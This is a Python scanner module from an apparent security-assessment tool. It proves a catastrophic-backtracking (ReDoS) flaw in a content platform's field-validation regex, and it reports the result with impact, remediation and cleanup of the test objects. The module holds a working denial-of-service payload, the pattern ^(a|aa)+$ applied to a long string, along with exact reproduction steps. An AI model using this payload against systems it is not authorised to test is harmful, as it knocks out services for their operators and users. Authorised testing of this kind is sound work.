"""Field-validation ReDoS — attacker-supplied regex compiled without limits.

A target content-type field carries an optional `regexCheck`. On every content
save the platform compiles it and runs Pattern.matches() against the submitted
value (ESContentletAPIImpl), with no timeout, no complexity analysis and no cap
on the input length. A regex with nested quantifiers therefore backtracks
catastrophically, and on a long non-matching value the match recursion exhausts
the request thread's stack.

Reproduced live on 26.x with regexCheck `^(a|aa)+$`:

    value length 500    -> HTTP 400, "The field probe doesn't comply..."  (normal)
    value length 3000   -> HTTP 500, java.lang.StackOverflowError in
                           java.util.regex.Pattern$Loop.match
    value length 12000  -> HTTP 500, same

The detectable signature needs no log access: with one regex held constant, the
response DEGRADES from a clean validation rejection at a short input to a server
error (or a timeout) at a longer one. A validation routine that answers 400 for
one input and 500 for a longer one is not validating, it is crashing.

Impact is denial of service by any principal who can save content of that type;
it is worse where field definitions are delegated, since the regex itself then
becomes attacker-supplied. Everything created here is registered with
deluluscan.artifacts and removed afterwards.
"""
from __future__ import annotations

import json
import time
from typing import Iterable, Optional

from ..artifacts import ArtifactRegistry
from ..models import Endpoint, Finding, Severity, VulnClass
from .base import Scanner, canary

# Nested alternation with a quantifier: linear to match, exponential to fail.
_EVIL_REGEX = r"^(a|aa)+$"
_SHORT, _LONG = 500, 3000
_TEXT_FIELD = "com.example.model.field.TextField"
_SIMPLE_TYPE = "com.example.model.type.SimpleType"


class RegexDosScanner(Scanner):
    """Prove that field-validation regexes run without a timeout or size cap."""

    name = "regex_dos"
    vuln_classes = [VulnClass.RATE_LIMIT.value, VulnClass.ERROR_HANDLING.value]

    def applies_to(self, endpoint: Endpoint) -> bool:
        # Runs once per scan, anchored on content-type creation, and only with
        # explicit permission to change state (it must define a content type).
        return (endpoint.path == "/api/items"
                and endpoint.method.upper() == "POST"
                and getattr(self.config.scan, "allow_state_changing", False)
                and "admin" in self.identities)

    def _req(self, method: str, path: str, label: str, body=None, params=None):
        ident = self.identities.get(label)
        if ident is None:
            return None
        headers = dict(self.auth.headers_for(ident))
        headers["Content-Type"] = "application/json"
        return self.client.request(method, path, identity_label=label, headers=headers,
                                   params=params,
                                   data=json.dumps(body) if body is not None else None)

    @staticmethod
    def _entity(rec):
        if rec is None or not (200 <= rec.status < 300):
            return None
        try:
            e = json.loads(rec.resp_body or "{}").get("entity")
        except (ValueError, TypeError):
            return None
        return e[0] if isinstance(e, list) and e else e

    def run(self, endpoint: Endpoint) -> Iterable[Finding]:
        marker = canary("rx")
        var = f"deluluscanRegexProbe{marker}"
        registry = ArtifactRegistry()
        findings: list[Finding] = []

        try:
            created = self._req("POST", "/api/items", "admin", {
                "clazz": _SIMPLE_TYPE, "name": var, "variable": var, "host": "SYSTEM_HOST",
                "fields": [{"clazz": _TEXT_FIELD, "name": "probe", "variable": "probe",
                            "required": False, "indexed": True}]})
            ent = self._entity(created)
            ctid = (ent or {}).get("id")
            if not ctid:
                return

            def _delete_ct() -> bool:
                rec = self._req("DELETE", f"/api/items/id/{ctid}", "admin")
                # the target acknowledges with {"deleted":"<id>"}; treat that as the
                # delete having been accepted, but still verify below.
                return bool(rec and 200 <= rec.status < 300
                            and '"deleted"' in (rec.resp_body or ""))

            def _ct_gone() -> Optional[bool]:
                # Deletion is NOT immediately visible: the type is cached, so a
                # GET issued straight after a successful DELETE still answers 200.
                # Retry briefly rather than declaring a false leak (or, worse,
                # trusting the delete blindly).
                for attempt in range(4):
                    rec = self._req("GET", f"/api/items/id/{ctid}", "admin")
                    if rec is None:
                        return None
                    if rec.status == 404:
                        return True
                    if attempt < 3:
                        time.sleep(2.0)
                return False

            registry.track("contenttype", ctid, description=f"ReDoS probe type {var}",
                           delete=_delete_ct, verify_gone=_ct_gone,
                           manual_hint=f"DELETE /api/items/id/{ctid}")

            # Locate the field (it is inline on the type; there is no
            # /contenttype/id/{id}/fields collection).
            fid = None
            for f in (ent.get("fields") or []):
                if f.get("variable") == "probe":
                    fid = f.get("id")
            if not fid:
                return

            upd = self._req("PUT", f"/api/items/{ctid}/fields/id/{fid}", "admin",
                            {"clazz": _TEXT_FIELD, "name": "probe", "variable": "probe",
                             "contentTypeId": ctid, "id": fid, "regexCheck": _EVIL_REGEX})
            if upd is None or not (200 <= upd.status < 300):
                return

            def _save(n: int):
                t0 = time.perf_counter()
                rec = self._req("PUT",
                                "/api/v1/workflow/actions/default/fire/PUBLISH", "admin",
                                {"contentlet": {"contentType": var, "probe": "a" * n + "!"}})
                return rec, (time.perf_counter() - t0)

            short_rec, short_s = _save(_SHORT)
            long_rec, long_s = _save(_LONG)
            if short_rec is None or long_rec is None:
                return

            # Any contentlet that did save is an artifact.
            for rec in (short_rec, long_rec):
                e = self._entity(rec)
                ident_id = (e or {}).get("identifier") if isinstance(e, dict) else None
                if ident_id:
                    registry.track(
                        "contentlet", ident_id, description="ReDoS probe contentlet",
                        delete=lambda i=ident_id: all(
                            self._req("PUT",
                                      f"/api/v1/workflow/actions/default/fire/{a}",
                                      "admin", params={"identifier": i}) is not None
                            for a in ("UNPUBLISH", "ARCHIVE", "DELETE")),
                        verify_gone=lambda: None,
                        manual_hint=f"fire UNPUBLISH/ARCHIVE/DELETE on {ident_id}")

            validated_ok = short_rec.status == 400
            degraded = long_rec.status >= 500 or long_rec.status == 0
            slow = long_s > max(3.0, short_s * 8)
            if not (validated_ok and (degraded or slow)):
                return

            how = (f"HTTP {short_rec.status} at {_SHORT} characters (a clean validation "
                   f"rejection) but HTTP {long_rec.status} at {_LONG}")
            if slow:
                how += f", and {long_s:.1f}s versus {short_s:.2f}s"
            yield_sev = Severity.HIGH if degraded else Severity.MEDIUM
            findings.append(Finding(
                vuln_class=VulnClass.RATE_LIMIT, severity=yield_sev,
                title="Content-field validation regex runs without a timeout or input cap "
                      "(catastrophic backtracking)",
                endpoint="PUT /api/v1/workflow/actions/default/fire/PUBLISH",
                description=(
                    f"A field configured with the regex {_EVIL_REGEX!r} returned {how}. The "
                    f"validation regex is compiled and matched against the submitted value on "
                    f"every save with no timeout, no complexity limit and no bound on input "
                    f"length, so a nested-quantifier pattern backtracks catastrophically. A "
                    f"routine that rejects one input cleanly and returns a server error for a "
                    f"longer one is not validating — the match is exhausting the request "
                    f"thread (observed server-side as java.lang.StackOverflowError inside "
                    f"java.util.regex.Pattern)."),
                evidence=[short_rec, long_rec],
                detail={"test": "field_regex_redos", "regex": _EVIL_REGEX,
                        "short_len": _SHORT, "short_status": short_rec.status,
                        "short_seconds": round(short_s, 3),
                        "long_len": _LONG, "long_status": long_rec.status,
                        "long_seconds": round(long_s, 3),
                        "impact": ("Any principal able to save content of an affected type can "
                                   "exhaust a request thread on demand. Where field definitions "
                                   "are delegated, the regex itself is attacker-supplied, so an "
                                   "author can arm the condition as well as trigger it. An "
                                   "invalid regex is also persisted without validation, which "
                                   "permanently breaks every later save of that type."),
                        "remediation": ("Match with a bounded engine or a watchdog thread, cap "
                                        "the input length before matching, and validate the "
                                        "regex when the field is defined — rejecting nested "
                                        "quantifiers and refusing patterns that fail a "
                                        "backtracking budget."),
                        "cwe": "CWE-1333",
                        "auto_confirm": {
                            "confirmed": True, "kind": "differential_observation",
                            "exploitability": "exploitable",
                            "reason": how,
                            "repro": (f"Define a text field with regexCheck {_EVIL_REGEX!r}, "
                                      f"then save a contentlet whose value is {_LONG} 'a' "
                                      f"characters followed by '!'.")}},
                confidence="firm", verdict="true_positive",
                exploitability="exploitable"))
        finally:
            report = registry.cleanup()
            if not report["clean"]:
                findings.append(Finding(
                    vuln_class=VulnClass.MISCONFIG, severity=Severity.HIGH,
                    title="Scan artifact could not be removed (assessment left an object behind)",
                    endpoint="(scanner)",
                    description=("This scanner created a content type to prove a finding and "
                                 "could not remove it afterwards. "
                                 + " ".join(report.get("messages", []))),
                    evidence=[], detail={"test": "artifact_leak",
                                         "artifacts": report["artifacts"]},
                    confidence="firm", verdict="true_positive",
                    exploitability="exploitable"))

        yield from findings
